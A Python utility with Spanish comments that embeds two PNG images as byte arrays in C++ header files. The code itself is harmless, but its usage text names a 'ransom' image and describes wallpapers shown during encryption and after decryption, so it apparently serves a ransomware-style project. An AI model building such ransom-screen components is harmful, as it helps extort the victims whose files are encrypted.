"""
Convierte una imagen a un archivo de cabecera C++
    
Args:
    image_path: Ruta de la imagen PNG
    output_header: Nombre del archivo .h de salida
    array_name: Nombre del array en C++
    size_constant: Nombre de la constante de tamaño
"""

import sys
import os

def image_to_header(image_path, output_header, array_name, size_constant):
    if not os.path.exists(image_path):
        print(f"Error: No se encuentra el archivo {image_path}")
        return False
    
    try:
        with open(image_path, 'rb') as img_file:
            image_data = img_file.read()
    except Exception as e:
        print(f"Error al leer el archivo: {e}")
        return False
    
    file_size = len(image_data)

    try:
        with open(output_header, 'w') as header_file:
            header_file.write(f"// Archivo generado automáticamente\n")
            header_file.write(f"// Imagen embebida: {os.path.basename(image_path)}\n")
            header_file.write(f"// Tamaño: {file_size} bytes\n\n")
            
            guard_name = output_header.upper().replace('.', '_').replace('-', '_')
            header_file.write(f"#ifndef {guard_name}\n")
            header_file.write(f"#define {guard_name}\n\n")
            
            header_file.write("#include <cstddef>\n\n")
            
            header_file.write(f"const size_t {size_constant} = {file_size};\n\n")
            
            header_file.write(f"const unsigned char {array_name}[{file_size}] = {{\n    ")
            
            bytes_per_line = 12
            for i, byte in enumerate(image_data):
                header_file.write(f"0x{byte:02X}")

                if i < file_size - 1:
                    header_file.write(", ")
                
                if (i + 1) % bytes_per_line == 0 and i < file_size - 1:
                    header_file.write("\n    ")

            header_file.write("\n};\n\n")
            
            header_file.write(f"#endif // {guard_name}\n")
        
        print(f"✓ Archivo generado exitosamente: {output_header}")
        print(f"  - Tamaño de imagen: {file_size} bytes")
        print(f"  - Array: {array_name}")
        print(f"  - Constante de tamaño: {size_constant}")
        return True
        
    except Exception as e:
        print(f"Error al escribir el archivo de cabecera: {e}")
        return False

def main():
    print("=" * 60)
    print("CONVERTIDOR DE IMÁGENES A CABECERAS C++")
    print("=" * 60)
    print()
    
    if len(sys.argv) < 3:
        print("Uso del script:")
        print(f"  python {sys.argv[0]} <imagen1.png> <imagen2.png>")
        print()
        print("Ejemplo:")
        print(f"  python {sys.argv[0]} phc_ransom.png phc_decrypted.png")
        print()
        print("Esto generará:")
        print("  - phc_image_data.h (primera imagen)")
        print("  - phc_image_final.h (segunda imagen)")
        return 1
    
    image1_path = sys.argv[1]
    print(f"Procesando primera imagen: {image1_path}")
    success1 = image_to_header(
        image1_path,
        "phc_image_data.h",
        "PHC_IMAGE_DATA",
        "PHC_IMAGE_SIZE"
    )
    print()
    
    image2_path = sys.argv[2]
    print(f"Procesando segunda imagen: {image2_path}")
    success2 = image_to_header(
        image2_path,
        "phc_image_final.h",
        "PHC_IMAGE_FINAL",
        "PHC_FINALIMAGE_SIZE"
    )
    print()
    
    if success1 and success2:
        print("=" * 60)
        print("✓ CONVERSIÓN COMPLETADA EXITOSAMENTE")
        print("=" * 60)
        print()
        print("Archivos generados:")
        print("  1. phc_image_data.h   - Wallpaper durante encriptación")
        print("  2. phc_image_final.h  - Wallpaper después de desencriptar")
        print()
        print("Incluye estos archivos en tu proyecto C++ con:")
        print('  #include "phc_image_data.h"')
        print('  #include "phc_image_final.h"')
        return 0
    else:
        print("✗ Error: No se pudieron generar todos los archivos")
        return 1

if __name__ == "__main__":
    sys.exit(main())